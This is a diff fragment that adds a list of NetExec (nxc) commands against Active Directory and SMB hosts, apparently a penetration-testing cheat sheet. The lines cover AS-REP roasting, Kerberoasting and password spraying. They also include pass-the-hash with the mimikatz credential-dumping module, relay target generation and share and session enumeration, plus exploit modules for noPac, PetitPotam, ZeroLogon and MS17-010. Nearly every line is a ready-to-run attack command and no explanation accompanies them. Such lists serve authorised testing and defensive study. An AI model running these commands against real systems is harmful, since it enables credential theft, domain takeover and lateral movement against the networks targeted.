@@ -19,3 +19,25 @@ netexec smb "$IP" -u "$USER" -p "$PASSWORD" -M petitpotam
 netexec smb "$IP" -u '' -p '' -M zerologon
 netexec smb "$IP" -u '' -p '' -M ms17-010
 netexec smb "$IP" -u '' -p '' -M ioxidresolver
+netexec smb --list-modules
+nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
+nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
+nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
+nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
+nxc smb "$TARGET" --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
+nxc smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
+nxc smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M enum_avproducts
+nxc smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M mimikatz
+nxc smb "$TARGET" -u '' -p '' --pass-pol
+nxc smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
+nxc smb 192.168.56.0/24 --local-auth -u '' -p ''
+nxc smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --loggedon-users
+nxc smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --sessions
+nxc smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --shares
+nxc smb 192.168.56.0/24 -u '' -p '' --shares
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" -M noPac
+nxc smb "$IP" -u "$USER" -p "$PASSWORD" -M petitpotam
+nxc smb "$IP" -u '' -p '' -M zerologon
+nxc smb "$IP" -u '' -p '' -M ms17-010
+nxc smb "$IP" -u '' -p '' -M ioxidresolver
+
